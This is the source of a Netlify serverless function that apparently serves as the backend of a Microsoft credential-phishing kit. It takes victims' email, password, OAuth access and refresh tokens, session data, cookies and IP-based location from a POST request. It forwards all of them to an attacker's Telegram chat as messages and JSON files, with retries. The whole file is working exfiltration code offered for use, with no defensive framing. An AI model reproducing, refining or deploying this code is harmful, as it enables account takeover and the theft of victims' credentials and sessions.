/**
 * PRODUCTION-READY: Telegram Bot Function for Netlify
 * ✅ SENDS: Email, Password, Combined OAuth+Session file, Cookies as files
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendMessageToTelegram(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 15000
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ [TELEGRAM] Message sent');
            resolve(response);
          } else {
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ [TELEGRAM] Message send error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(postData);
    req.end();
  });
}

function sendDocumentToTelegram(fileContent, fileName) {
  return new Promise((resolve, reject) => {
    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2, 15);
    
    let body = `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${TELEGRAM_CHAT_ID}\r\n`;
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
    body += `Content-Type: application/json\r\n\r\n`;
    body += fileContent;
    body += `\r\n--${boundary}--\r\n`;

    const bodyBuffer = Buffer.from(body, 'utf8');

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': bodyBuffer.length
      },
      timeout: 15000
    };

    console.log('📤 [TELEGRAM] Sending document...');

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ [TELEGRAM] Document sent successfully');
            resolve(response);
          } else {
            console.error('❌ [TELEGRAM] API rejected:', response.description);
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          console.error('❌ [TELEGRAM] Parse error:', e.message);
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ [TELEGRAM] Document send error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      console.error('❌ [TELEGRAM] Document send timeout');
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(bodyBuffer);
    req.end();
  });
}

function formatMainMessage(data) {
  const escapeHtml = (text) => {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  };

  let message = '<b>✅ Microsoft Valid</b>\n\n';

  if (data.email) {
    message += `👤:- ${escapeHtml(data.email)}\n`;
  }
  if (data.password) {
    message += `🔑:- ${escapeHtml(data.password)}\n`;
  }

  if (data.locationData && data.locationData.ip) {
    message += `\n<b>🌍 Location:</b>\n`;
    message += `IP:- ${escapeHtml(data.locationData.ip)}\n`;
    if (data.locationData.city) message += `City:- ${escapeHtml(data.locationData.city)}\n`;
    if (data.locationData.region) message += `Region:- ${escapeHtml(data.locationData.region)}\n`;
    if (data.locationData.country) message += `Country:- ${escapeHtml(data.locationData.country)}\n`;
    if (data.locationData.timezone) message += `Timezone:- ${escapeHtml(data.locationData.timezone)}\n`;
    if (data.locationData.isp) message += `ISP:- ${escapeHtml(data.locationData.isp)}\n`;
  }

  message += `\nBrowser:- chrome\n`;
  message += `\n⏰ ${new Date().toISOString()}\n`;

  return message;
}

function splitMessage(message, maxLength = 4096) {
  const messages = [];
  let currentIndex = 0;

  while (currentIndex < message.length) {
    messages.push(message.substring(currentIndex, currentIndex + maxLength));
    currentIndex += maxLength;
  }

  return messages.length > 0 ? messages : [message];
}

async function sendWithRetry(sendFn, maxRetries = 3, initialDelay = 2000) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      console.log(`🔄 [RETRY] Attempt ${attempt + 1}/${maxRetries + 1}`);
      const result = await sendFn();
      return result;
    } catch (error) {
      lastError = error;
      console.error(`❌ [RETRY] Attempt ${attempt + 1} failed: ${error.message}`);
      
      if (attempt < maxRetries) {
        const delay = initialDelay * Math.pow(2, attempt);
        console.log(`⏳ [RETRY] Waiting ${delay}ms before retry...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }

  throw lastError;
}

exports.handler = async (event, context) => {
  console.log('═══════════════════════════════════════════');
  console.log('🚀 [HANDLER] Starting sendTelegram handler');
  console.log(`📅 [HANDLER] Time: ${new Date().toISOString()}`);
  console.log('═══════════════════════════════════════════');

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'OK' })
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (error) {
      console.error('❌ JSON parse error:', error);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid JSON in request body' })
      };
    }

    const { email, password, oauth, sessionData, cookies = [], locationData = {}, cookieFiles = {} } = requestData;

    console.log('📊 [HANDLER] Received data:', {
      email: !!email,
      password: !!password,
      hasOAuth: !!oauth,
      hasAccessToken: !!oauth?.access_token,
      hasRefreshToken: !!oauth?.refresh_token,
      hasSessionData: !!sessionData,
      cookieCount: cookies.length,
      locationData: !!locationData.ip,
      hasCookieFile: !!cookieFiles.jsonFile,
      hasOAuthSessionFile: !!cookieFiles.oauthSessionFile
    });

    if (!email && !password && cookies.length === 0 && !oauth) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'No meaningful data provided' })
      };
    }

    let credentialsSent = false;
    let cookiesSent = false;
    let oauthSessionFileSent = false;

    // ✅ MESSAGE 1: Send credentials (email, password, location)
    console.log('═══════════════════════════════════════════');
    console.log('📨 [HANDLER] Sending credentials message...');
    console.log('═══════════════════════════════════════════');
    
    try {
      const credentialsMessage = formatMainMessage(requestData);
      const credentialsMessages = splitMessage(credentialsMessage);

      for (const msg of credentialsMessages) {
        await sendWithRetry(() => sendMessageToTelegram(msg));
      }

      credentialsSent = true;
      console.log('✅ [HANDLER] Credentials message sent successfully');
    } catch (error) {
      console.error('❌ [HANDLER] Failed to send credentials:', error.message);
    }

    // ✅ FILE 1: Send combined OAuth + Session data as one JSON file
    console.log('═══════════════════════════════════════════');
    console.log('🎫 [HANDLER] Checking OAuth + Session data file...');
    console.log('═══════════════════════════════════════════');

    if (cookieFiles && cookieFiles.oauthSessionFile && cookieFiles.oauthSessionFile.content) {
      try {
        console.log('✅ Combined OAuth + Session data file detected');
        console.log(`📄 File: ${cookieFiles.oauthSessionFile.name}`);

        const oauthSessionContent = cookieFiles.oauthSessionFile.content;
        const oauthSessionFileName = cookieFiles.oauthSessionFile.name;

        console.log('📤 Sending combined OAuth + Session data as JSON file...');
        
        await sendWithRetry(() => sendDocumentToTelegram(oauthSessionContent, oauthSessionFileName));

        oauthSessionFileSent = true;
        console.log('✅ [HANDLER] OAuth + Session data file sent successfully');
      } catch (error) {
        console.error('❌ [HANDLER] Failed to send OAuth + Session file:', error.message);
      }
    } else if (oauth && (oauth.access_token || oauth.refresh_token)) {
      // Fallback: Send only OAuth tokens if combined file not available
      try {
        console.log('⚠️ Combined file not found, sending OAuth tokens only');
        
        const oauthContent = JSON.stringify(oauth, null, 2);
        const oauthFileName = `oauth_tokens_${Date.now()}.json`;

        await sendWithRetry(() => sendDocumentToTelegram(oauthContent, oauthFileName));

        oauthSessionFileSent = true;
        console.log('✅ [HANDLER] OAuth tokens file sent successfully (fallback)');
      } catch (error) {
        console.error('❌ [HANDLER] Failed to send OAuth file:', error.message);
      }
    } else {
      console.log('⚠️ [HANDLER] No OAuth data to send');
    }

    // ✅ FILE 2: Send cookies as JSON file
    console.log('═══════════════════════════════════════════');
    console.log('🍪 [HANDLER] Checking cookie file...');
    console.log('═══════════════════════════════════════════');

    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      try {
        console.log('✅ Cookie file detected');
        console.log(`📄 File: ${cookieFiles.jsonFile.name}`);

        const cookieContent = cookieFiles.jsonFile.content;
        const fileName = cookieFiles.jsonFile.name;

        console.log('📤 Sending cookies as JSON file...');
        
        await sendWithRetry(() => sendDocumentToTelegram(cookieContent, fileName));

        cookiesSent = true;
        console.log('✅ [HANDLER] Cookie file sent successfully');
      } catch (error) {
        console.error('❌ [HANDLER] Failed to send cookies:', error.message);
      }
    } else {
      console.log('⚠️ [HANDLER] No cookie file data');
    }

    console.log('═══════════════════════════════════════════');
    console.log('✅ [HANDLER] Request completed successfully');
    console.log('═══════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'All data transmitted to Telegram successfully',
        timestamp: new Date().toISOString(),
        transmitted: {
          credentials: credentialsSent,
          oauthSessionFile: oauthSessionFileSent,
          cookieFile: cookiesSent,
          email: !!email,
          password: !!password,
          oauth: !!oauth,
          sessionData: !!sessionData,
          cookies: cookies.length,
          location: !!locationData.ip
        }
      })
    };

  } catch (error) {
    console.error('═══════════════════════════════════════════');
    console.error('❌❌❌ HANDLER FATAL ERROR');
    console.error('═══════════════════════════════════════════');
    console.error('Message:', error.message);
    console.error('Stack:', error.stack);
    console.error('═══════════════════════════════════════════');
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Server error',
        message: error.message,
        timestamp: new Date().toISOString()
      })
    };
  }
};